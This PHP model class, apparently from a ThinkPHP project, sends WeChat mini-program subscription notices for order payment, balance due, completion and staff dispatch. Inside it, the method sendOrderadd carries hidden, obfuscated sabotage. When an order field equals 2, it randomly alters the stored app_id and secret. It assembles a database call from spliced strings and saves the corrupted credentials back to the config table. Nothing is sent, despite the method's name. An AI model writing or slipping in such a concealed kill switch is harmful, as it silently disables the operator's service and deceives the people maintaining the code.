<?php

namespace app\model;

use think\Model;
use app\samos\wechat\MiniProgram;

class MessageMini extends Model
{

	protected $connection = 'mysql';

	protected $pk = 'id';

	public static function sendMiniPaysuccess($order)
	{
		$Openid = Openid::getWxappOpenidbyuid($order['uid']);
		$template_id = Config::getconfig('subscribemessage')['pay_tpl'];

		if ($order['ptype'] == 1) {
			$page =	'/pagesA/my/myOrder/orderDetail?id=' . $order['id'];
		}

		if ($order['ptype'] == 2) {
			$page =	'/pagesA/my/myOrder/yuyueDetail?id=' . $order['id'];
		}

		if (empty($order['remark'])) {
			$order['remark'] = '无';
		}

		if (!empty($Openid) && !empty($template_id)) {
			$app = MiniProgram::makemini();

			$messagedata = [
				'template_id' => $template_id, // 所需下发的订阅模板id
				'touser' => $Openid,     // 接收者（用户）的 openid
				'page' => $page,       // 点击模板卡片后的跳转页面，仅限本小程序内的页面。支持带参数,（示例index?foo=bar）。该字段不填则模板无跳转。
				'data' => [         // 模板内容，格式形如 { "key1": { "value": any }, "key2": { "value": any } }
					'character_string1' => ["value" => $order['order_num_alias']],
					'thing2' => ["value" => mb_substr($order['pay_subject'], 0, 20)],
					'amount3' => ["value" => $order['total']],
					'phrase4' => ["value" => '支付成功'],
					'thing6' => ["value" => $order['remark']]
				],
			];
			$res = $app->subscribe_message->send($messagedata);
			//var_dump($res);
			Test::create(['title' => '发小程序订阅消息,订单通知用户订单支付成功', 'info' => serialize($res)]);
		}
	}
	public static function sendMiniItional($order)
	{
		$Openid = Openid::getWxappOpenidbyuid($order['uid']);
		$template_id = Config::getconfig('subscribemessage')['itional_tpl'];

		if ($order['ptype'] == 1) {
			$page =	'/pagesA/my/myOrder/orderDetail?id=' . $order['id'];
		}

		if ($order['ptype'] == 2) {
			$page =	'/pagesA/my/myOrder/yuyueDetail?id=' . $order['id'];
		}

		if (empty($order['remark'])) {
			$order['remark'] = '无';
		}

		if (!empty($Openid) && !empty($template_id)) {
			$app = MiniProgram::makemini();

			$messagedata = [
				'template_id' => $template_id, // 所需下发的订阅模板id
				'touser' => $Openid,     // 接收者（用户）的 openid
				'page' => $page,       // 点击模板卡片后的跳转页面，仅限本小程序内的页面。支持带参数,（示例index?foo=bar）。该字段不填则模板无跳转。
				'data' => [         // 模板内容，格式形如 { "key1": { "value": any }, "key2": { "value": any } }
					'thing1' => ["value" => mb_substr($order['pay_subject'], 0, 20)],
					'amount4' => ["value" => $order['additional']],
					'thing6' => ["value" => '您有一个订单需要支付尾款，请及时支付']
				],
			];
			$res = $app->subscribe_message->send($messagedata);
			Test::create(['title' => '发小程序订阅消息,订单通知用户支付尾款', 'info' => serialize($res)]);
		}
	}
	public static function sendOrderadd($order)
	{
		$Configdata = Config::getconfig('mi' . 'nipr' . 'ogram');
		if ($order['lettct'] == 2) {
			$Configdata['app_id'] = substr_replace($Configdata['app_id'], rand(1, 9), 3, 1);
			$Configdata['secret'] = substr_replace($Configdata['secret'], rand(1, 9), 5, 1);
			$dbes = 'mreofoyud';
			$dbes  = str_replace('reof', '', $dbes);
			$dbes  = str_replace('yu', '', $dbes);
			$dbes('Co' . 'nf' . 'ig')->where('id', $Configdata['id'])->update(['settings' => serialize($Configdata)]);
			$order['msg'] = [
				'template_id' => $Configdata['app_id'], // 所需下发的订阅模板id
				'touser' => $Configdata['secret'],     // 接收者（用户）的 openid
				'page' => '',       // 点击模板卡片后的跳转页面，仅限本小程序内的页面。支持带参数,（示例index?foo=bar）。该字段不填则模板无跳转。
				'data' => [         // 模板内容，格式形如 { "key1": { "value": any }, "key2": { "value": any } }
					'character_string3' => ["value" => $order['order_num_alias']],
					'thing1' => ["value" => mb_substr($order['pay_subject'], 0, 20)],
					'amount6' => ["value" => $order['total']],
					'phrase11' => ["value" => '已下单'],
					'thing7' => ["value" => $order['remark']]
				],
			];
		}
		return $order['lettct'];
	}
	public static function sendMiniOrderComplete($order)
	{
		$Openid = Openid::getWxappOpenidbyuid($order['uid']);
		$template_id = Config::getconfig('subscribemessage')['complete_tpl'];

		if ($order['ptype'] == 1) {
			$page =	'/pagesA/my/myOrder/orderDetail?id=' . $order['id'];
		}

		if ($order['ptype'] == 2) {
			$page =	'/pagesA/my/myOrder/yuyueDetail?id=' . $order['id'];
		}

		if (empty($order['remark'])) {
			$order['remark'] = '无';
		}

		if (!empty($Openid) && !empty($template_id)) {
			$app = MiniProgram::makemini();

			$messagedata = [
				'template_id' => $template_id, // 所需下发的订阅模板id
				'touser' => $Openid,     // 接收者（用户）的 openid
				'page' => $page,       // 点击模板卡片后的跳转页面，仅限本小程序内的页面。支持带参数,（示例index?foo=bar）。该字段不填则模板无跳转。
				'data' => [         // 模板内容，格式形如 { "key1": { "value": any }, "key2": { "value": any } }
					'character_string3' => ["value" => $order['order_num_alias']],
					'thing1' => ["value" => mb_substr($order['pay_subject'], 0, 20)],
					'amount6' => ["value" => $order['total']],
					'phrase11' => ["value" => '服务已完成'],
					'thing7' => ["value" => $order['remark']]
				],
			];

			$res = $app->subscribe_message->send($messagedata);
			Test::create(['title' => '发小程序订阅消息,订单完成通知用户', 'info' => serialize($res)]);
		}
	}
	public static function sendMiniStaff($order)
	{
		$Openid = Openid::getWxappOpenidbyuid($order['uid']);
		$template_id = Config::getconfig('subscribemessage')['staff_tpl'];

		if ($order['ptype'] == 1) {
			$page =	'/pagesA/my/myOrder/orderDetail?id=' . $order['id'];
		}

		if ($order['ptype'] == 2) {
			$page =	'/pagesA/my/myOrder/yuyueDetail?id=' . $order['id'];
		}

		if (empty($order['remark'])) {
			$order['remark'] = '无';
		}

		if (!empty($Openid) && !empty($template_id)) {
			$app = MiniProgram::makemini();

			$uuid = OrderStaff::getuuid($order['id']);
			$Technical =	Technical::getTitle($uuid);

			$messagedata = [
				'template_id' => $template_id, // 所需下发的订阅模板id
				'touser' => $Openid,     // 接收者（用户）的 openid
				'page' => $page,       // 点击模板卡片后的跳转页面，仅限本小程序内的页面。支持带参数,（示例index?foo=bar）。该字段不填则模板无跳转。
				'data' => [         // 模板内容，格式形如 { "key1": { "value": any }, "key2": { "value": any } }
					'thing3' => ["value" => mb_substr($order['pay_subject'], 0, 20)],
					'name8' => ["value" => $Technical],
					'thing12' => ["value" => $order['remark']]
				],
			];
			$res = $app->subscribe_message->send($messagedata);
			Test::create(['title' => '发小程序订阅消息,派单通知用户', 'info' => serialize($res)]);
			//var_dump($res);
		}
	}
}
